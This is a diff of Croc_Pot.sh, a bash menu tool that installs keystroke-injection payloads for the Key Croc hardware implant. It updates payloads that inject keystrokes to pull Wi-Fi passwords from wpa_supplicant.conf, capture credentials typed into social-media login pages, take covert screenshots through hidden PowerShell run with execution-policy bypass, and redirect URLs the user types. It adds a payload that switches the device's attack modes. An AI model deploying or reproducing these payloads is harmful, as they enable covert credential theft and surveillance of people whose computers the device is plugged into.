@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.7.4
+# Version:       1.7.5
 # Category:      Key Croc
 ##
 ##
@@ -122,6 +122,7 @@ user_agent_random
 croc_timezone=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone)
 if [[ "$croc_timezone" == "$(timedatectl | grep -e 'Time zone' | awk {'print $3'})" ]]; then
 	LED G
+	echo -ne "${yellow}Keycroc timezone set for ${croc_timezone}${clear}\n"
 else
 	LED SETUP
 	echo -ne "${yellow}Changing Keycroc timezone to ${croc_timezone}${clear}\n"
@@ -158,7 +159,7 @@ fi
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232;1m${LINE}${clear}
-${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.4${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.5${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
 ${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
 ${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< ${croc_timezone})${clear}${cyan} $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} KEYBOARD:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b}${clear}
 \e[40;38;5;202m»»»»»»»»»»»» ${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m «««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} TEMP:${clear}${cyan}$(cat /sys/class/thermal/thermal_zone0/temp)°C${clear}${yellow} USAGE:${clear}${cyan}$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))${clear}${yellow}MEM:${clear}${cyan}$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
@@ -306,15 +307,15 @@ done
 ##
 function start_web() {
 if [ "$(OS_CHECK)" = WINDOWS ]; then
-	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process ${1}; exit" ; Q ENTER
+	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "Start-Process ${1} ; exit" ; Q ENTER
 else
 	case $HOST_CHECK in
 raspberrypi)
-	Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1}; exit" ; Q ENTER ;;
+	Q CONTROL-ALT-t ; sleep 1 ; Q STRING "chromium-browser ${1} & exit" ; Q ENTER ;;
 parrot)
-	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1}; exit" ; Q ENTER ;;
+	Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
 *)
-	Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1}; exit" ; Q ENTER ;;
+	Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "gio open ${1} & exit" ; Q ENTER ;;
 	esac
 fi
 }
@@ -4879,7 +4880,7 @@ else
 case $r_a in
 [yY] | [yY][eE][sS])
 	echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
-LED ATTACK\n# --> start Raspberry PI terminal\nQ GUI d\nQ CONTROL-ALT-F1\nsleep 1\nQ STRING \"cp -u /usr/share/applications/lxterminal.* /home/\\\$(whoami)/Desktop\"\nQ ENTER\nQ ALT-F7\nsleep 1\nQ STRING \"LXTerminal\"\nQ ENTER\nQ ENTER\nsleep 2
+LED ATTACK\n# --> start Raspberry PI terminal\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 2
 # --> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Retrieve Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
 Q ENTER\nsleep 1\n# --> Retrieve Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
 Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 2\n# --> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
@@ -4989,11 +4990,11 @@ case $r_a in
 [yY] | [yY][eE][sS])
 	echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
 #                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
-echo \"\${CROC_PW}\" >> /tmp/CPW.txt\nQ GUI d\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	Q GUI d\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
 	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
-	LED B\n	Q ENTER\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
-	Q ENTER ;;\n    parrot)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
-	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
+	LED B\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
+	Q ENTER ;;\n    parrot)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
+	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	Q GUI d\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
 	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" >> ${qs_croc}
 	echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
 	echo -ne "\n${LINE}\n" ; cat ${qs_croc} ; echo -ne "\n${LINE}\n" ;;
@@ -5038,8 +5039,8 @@ else\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n\nif [ -d /root/udisk/l
 echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_Pot\screenshot\\\\\\\\\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\\\"\\\n\nAdd-Type -AssemblyName System.Windows.Forms\\\nAdd-type -AssemblyName System.Drawing\\\n\n\\\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\\\n\\\$Width = \\\$Screen.Width\\\n
 \\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
 \\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
-	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q GUI d\n	sleep 1\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER
-	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	Q ALT-TAB\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\nparrot)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
+	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q CONTROL-ALT-t
+	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	sleep 2\n	ATTACKMODE HID\n	LED FINISH ;;\nparrot)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
 	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
 	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
 	ATTACKMODE HID\n	LED FINISH ;;\n*)\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
@@ -5079,21 +5080,21 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 else
 	case $HOST_CHECK in
 	raspberrypi)
-		sleep 1 ; Q ALT-F4 ; Q GUI d ; sleep 1 ; Q STRING "LXTerminal" ; Q ENTER ; Q ENTER ; sleep 1
-		Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \${PC_PIC} &>/dev/null & exit"
-		Q ENTER ; Q ALT-TAB ; Q ALT-TAB ; sleep 10 ; ATTACKMODE HID ;;
+		Q ALT-TAB ; Q CONTROL-ALT-t ; sleep 1
+		Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 2 \${PC_PIC} &>/dev/null & exit"
+		Q ENTER ; Q ALT-TAB ; sleep 3 ; ATTACKMODE HID ;;
 	parrot)
 		Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1
 		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 		Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
 		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-		Q ENTER ; Q ALT-TAB ; sleep 10 ; ATTACKMODE HID ;;
+		Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
 	*)
 		Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1
 		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 		Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
 		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-		Q ENTER ; Q ALT-TAB ; sleep 10 ; ATTACKMODE HID ;;
+		Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
 	esac
 fi ;;
 	[nN] | [nN][oO])
@@ -5143,7 +5144,7 @@ bite_payload() {
 	echo -ne "# Title:         Croc_Bite\n# Description:   Social media account passwd attempt this will open target pc web browser and open login page\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH ${1}\n
 if [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -NoP -NonI -W Hidden -Exec Bypass\"\n	Q ENTER
 	sleep 2\n	Q STRING \"Start-Process ${@:2}; exit\"\n	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
-raspberrypi)\n	Q GUI d\n	Q CONTROL-ALT-F1\n	sleep 1\n	Q STRING \"cp -u /usr/share/applications/lxterminal.* /home/\\\$(whoami)/Desktop\"\n	Q ENTER\n	Q ALT-F7\n	sleep 5\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
+raspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
 	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\nparrot)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
 	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
 	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi\nLED FINISH" >> /root/udisk/payloads/Croc_Bite.txt
@@ -5191,7 +5192,7 @@ case $r_a in
 MATCH (^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$|http://|https://|\.com|\.br|\.net|\.org|.cz|\.au|\.co|\.jp|\.cn|\.ru|\.in|\.ir|\.ua|\.ca|\.xyz|\.site|\.top|\.icu|\.vip|\.online|\.de)\n\n#-->Enter Redirected web page here\nREDIRECT=https://forums.hak5.org/\n
 #-->Remove user input and replace with Redirected web page\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ STRING \"\${REDIRECT}\"\nQ ENTER\nLED FINISH\nsleep 1\n\n#-->This will open target pc default web browser and start website\nif [ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then
 	LED ATTACK\n	OS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	case \$OS_CHECK in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 2
-	Q STRING \"Start-Process \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\nLINUX)\n	case \$HOST_CHECK in\nraspberrypi)\n	Q GUI d\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;
+	Q STRING \"Start-Process \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\nLINUX)\n	case \$HOST_CHECK in\nraspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;
 parrot)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"
 	Q ENTER\n	LED FINISH ;;\n	esac\n	;;\nesac\nelse\n	LED R\nfi\n" >> ${Croc_Redirect}
 	echo -ne "\n${green}Croc_Redirect.txt payload is now install check payloads folder${clear}\n"
@@ -5834,17 +5835,66 @@ fi
 esac
 }
 ##
+#----Croc_Attackmode payload Start keycroc Attackmode commands by entering match word
+##
+attack_mode() {
+	echo -ne "$(Info_Screen '
+-Croc_Attackmode payload
+-Select which attackmode command to enter by match word:
+
+storagemode <-- will run ATTACKMODE HID STORAGE
+hidmode <-- will run ATTACKMODE HID
+offmode <-- will run ATTACKMODE OFF
+reloadmode <-- will run RELOAD_PAYLOADS
+armingmode <-- will run ARMING_MODE
+rostoragemode <-- will run ATTACKMODE RO_STORGE
+autoethernet <-- will run ATTACKMODE AUTO_ETHERNET
+serialmode <-- will run ATTACKMODE SERIAL
+
+-On some attackmode command after running reset keycroc
+by unplugging keycroc and plug back in')\n\n"
+##
+#----Croc_Attackmode payload install
+##
+local Croc_Attackmode=/root/udisk/payloads/Croc_Attackmode.txt
+if [ -e "${Croc_Attackmode}" ]; then
+	echo -ne "\n$(ColorGreen 'CROC_ATTACKMODE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
+	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_Attackmode.txt ; echo -ne "\n${LINE}\n"
+else
+	read_all INSTALL CROC_ATTACKMODE PAYLOAD Y/N AND PRESS [ENTER]
+	case $r_a in
+[yY] | [yY][eE][sS])
+	echo -ne "# Title:         Croc Attack_mode\n#\n# Description:   Enter keycroc ATTACKMODE commands with payload just enter match word\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n
+MATCH (storagemode|hidmode|offmode|reloadmode|armingmode|rostoragemode|autoethernet|serialmode)\n\ncase \$LOOT in\n	storagemode) ATTACKMODE HID STORAGE ;;\n	hidmode) ATTACKMODE HID ;;\n	offmode) ATTACKMODE OFF ;;
+	reloadmode) RELOAD_PAYLOADS ;;\n	armingmode) ARMING_MODE ;;\n	rostoragemode) ATTACKMODE RO_STORGE ;;\n	autoethernet) ATTACKMODE AUTO_ETHERNET ;;\n	serialmode) ATTACKMODE SERIAL ;;\nesac\n" >> ${Croc_Attackmode}
+	echo -ne "\n$(ColorGreen 'CROC_ATTACKMODE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
+	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_Attackmode.txt ; echo -ne "\n${LINE}\n" ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+*)
+	invalid_entry ; attack_mode ;;
+	esac
+fi
+}
+##
 #----Install Payloads Menu
 ##
-MenuTitle INSTALL PAYLOADS MENU ; MenuColor 22 1 GETONLINE PAYLOAD ; MenuColor 22 2 CROC_UNLOCK PAYLOAD ; MenuColor 22 3 WIFI SETUP PAYLOAD ; MenuColor 22 4 QUICK START CROC_POT
-MenuColor 22 5 CROC_SHOT PAYLOAD ; MenuColor 22 6 CROC_BITE PAYLOAD ; MenuColor 22 7 CROC_REDIRECT PAYLOAD ; MenuColor 22 8 NO SLEEPING PAYLOAD ; MenuColor 22 9 CROC_REPLACE PAYLOAD
-MenuColor 21 10 CROC_FORCE PAYLOAD ; MenuColor 21 11 CROC_LOCKOUT PAYLOAD ; MenuColor 21 12 WINDOWS DEFENDER ; MenuColor 21 13 CROC_CLOSE_IT PAYLOAD
-MenuColor 21 14 DOUBLE_UP PAYLOAD ; MenuColor 21 15 QUACK_ATTACK PAYLOAD ; MenuColor 21 16 KEYBOARD_KILLER ; MenuColor 21 17 RETURN TO MAIN MENU ; MenuEnd 25
+MenuTitle INSTALL PAYLOADS MENU
+echo -ne "\t\t" ; MenuColor 22 1 GETONLINE PAYLOAD | tr -d '\t\n' ; MenuColor 21 10 CROC_FORCE PAYLOAD | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 2 CROC_UNLOCK PAYLOAD | tr -d '\t\n' ; MenuColor 21 11 CROC_LOCKOUT PAYLOAD | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 3 WIFI SETUP PAYLOAD | tr -d '\t\n' ; MenuColor 21 12 WINDOWS DEFENDER | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 4 QUICK START CROC_POT | tr -d '\t\n' ; MenuColor 21 13 CROC_CLOSE_IT PAYLOAD | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 5 CROC_SHOT PAYLOAD | tr -d '\t\n' ; MenuColor 21 14 DOUBLE_UP PAYLOAD | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 6 CROC_BITE PAYLOAD | tr -d '\t\n' ; MenuColor 21 15 QUACK_ATTACK PAYLOAD | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 7 CROC_REDIRECT PAYLOAD | tr -d '\t\n' ; MenuColor 21 16 KEYBOARD_KILLER | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 8 NO SLEEPING PAYLOAD | tr -d '\t\n' ; MenuColor 21 17 KEYCROC ATTACKMODE | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 22 9 CROC_REPLACE PAYLOAD | tr -d '\t\n' ; MenuColor 21 18 RETURN TO MAIN MENU | tr -d '\t'
+MenuEnd 25
 	case $m_a in
 	1) get_online_p ; install_payloads ;; 2) croc_unlock_p ; install_payloads ;; 3) wifi_setup_p ; install_payloads ;; 4) quick_croc_pot ; install_payloads ;; 5) screen_shot ; install_payloads ;;
 	6) croc_bite ; install_payloads ;; 7) web_site ; install_payloads ;; 8) screen_on ; install_payloads ;; 9) text_replace ; install_payloads ;; 10) Brute_force ; install_payloads ;;
 	11) croc_lock ; install_payloads ;; 12) windows_defender ; install_payloads ;; 13) close_it ; install_payloads ;;
-	14) double_up ; install_payloads ;; 15) q_attack ; install_payloads ;; 16) kb_killer ; install_payloads ;; 17) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; install_payloads ;;
